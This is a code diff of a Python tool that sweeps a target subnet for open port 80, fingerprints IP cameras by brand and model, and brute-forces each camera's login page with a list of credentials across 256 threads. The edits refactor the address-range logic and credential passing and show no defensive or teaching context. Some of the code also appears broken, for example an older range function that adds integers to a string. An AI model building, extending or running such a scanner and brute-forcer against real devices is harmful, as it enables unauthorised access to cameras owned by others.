@@ -2,9 +2,12 @@ import socket
 import threading
 import requests
 from queue import Queue
+import netaddr
 
-def ip_range(subnet):
-    return [ip for ip in range(subnet.split("/")[0], subnet.split("/")[0] + 256)]
+def ip_range(target_subnet):
+
+    network = netaddr.IPNetwork(target_subnet)
+    return [str(ip) for ip in network]
 
 def portscan(ip, port):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -22,7 +25,7 @@ def get_camera(ip, port):
     model = data.split()[1]
     cameras.append({'ip': ip, 'brand': brand, 'model': model})
 
-def bruteforce(ip):
+def bruteforce(ip, credentials):
     for username, password in credentials:
         try:
             url = f'http://{ip}/login.htm'
@@ -36,18 +39,19 @@ def bruteforce(ip):
 def scan(ip):
     if portscan(ip, 80):
         get_camera(ip, 80)
-        bruteforce(ip)
+        bruteforce(ip, credentials)
 
 try:
     cameras = []
     queue = Queue()
-    for ip in ip_range(subnet):
+    for ip in ip_range(target_subnet):
         queue.put(ip)
 
     threads = [] 
 
     for i in range(256):
         thread = threading.Thread(target=scan, args=(queue.get(),))
+        thread.daemon = True
         thread.start()
         threads.append(thread)
 
